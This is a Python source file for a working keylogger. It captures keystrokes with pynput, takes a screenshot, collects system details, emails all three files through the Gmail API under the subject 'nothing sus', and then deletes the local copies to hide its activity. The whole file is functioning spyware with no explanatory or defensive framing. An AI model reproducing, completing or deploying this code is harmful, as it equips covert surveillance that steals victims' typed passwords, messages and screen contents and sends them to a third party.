from pynput import keyboard
import time
import os
from pyautogui import screenshot
import base64
import platform
import sys
from datetime import datetime


# email imports
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.discovery import build

keys = []
all_files = ["key.txt", "s.png", "info.txt"]
SCOPES = ['https://www.googleapis.com/auth/gmail.send']

def get_path():

    if getattr(sys, 'frozen', False):
        current_Path = os.path.dirname(sys.executable)
    else:
        current_Path = str(os.path.dirname(__file__))
        
    return current_Path

def key_press(key):
    try:
        print(key)
        k = str(key).replace("'", "")
        keys.append(k)
    except AttributeError:
        print('special key {0} pressed'.format(key))
            

def key_release(key):
    if key == keyboard.Key.esc:
        return False


def save_file(keys):
    if not len(keys): 
        return False
    
    with open ("key.txt", 'a') as file:
        for key in keys:   
            if key.find("space") > 0 or key.find("enter") > 0:
                file.write('\n')
            elif key.find("Key") == -1:
                file.write(key)
        file.write("\n")
                
def screenshot_screen():
    im = screenshot()
    im.save("s.png")
    
# computer information + network information
def get_info(): 
    with open ("info.txt", 'a') as file:
        file.write("=="*10 + "Sys Info" + "="*40 + "\n")
        uname = platform.uname()
        file.write(f"System: {uname.system}\n")
        file.write(f"Node Name: {uname.node}\n")
        file.write(f"Release: {uname.release}\n")
        file.write(f"Version: {uname.version}\n")
        file.write(f"Machine: {uname.machine}\n")
        file.write(f"Processor: {uname.processor}\n")

def create_message(sender, to, subject, message_text):
    message = MIMEMultipart()
    message['to'] = to
    message['from'] = sender
    message['subject'] = subject

    msg = MIMEText(message_text)
    message.attach(msg)

    for f in all_files:
        with open(f, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(f)}')
        message.attach(part)

    return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}

def send_message(service, user_id, message):
    try:
        message = service.users().messages().send(userId=user_id, body=message).execute()
        print('Message Id: %s' % message['id'])
        return message
    except Exception as e:
        print(f'An error occurred: {e}')

def send_files():
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json')

    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    service = build('gmail', 'v1', credentials=creds)
    
    sender = ""
    to = ""
    subject = "nothing sus"
    message_text = ""

    message = create_message(sender, to, subject, message_text)
    send_message(service, "me", message)


def delete_files(): 
    for f in all_files:
        try:
            os.remove(f)
        except OSError:
            pass
        
def main(): 
    with keyboard.Listener(
    on_press=key_press,
    on_release=key_release) as listener:
        listener.join()
    with open ("key.txt", 'a') as file:
        t = time.ctime(time.time())
        t = t + "\n"
        file.write(str(t))
    save_file(keys)
    get_info()
    screenshot_screen()
    send_files()
    delete_files()

if __name__ == "__main__":
    main()  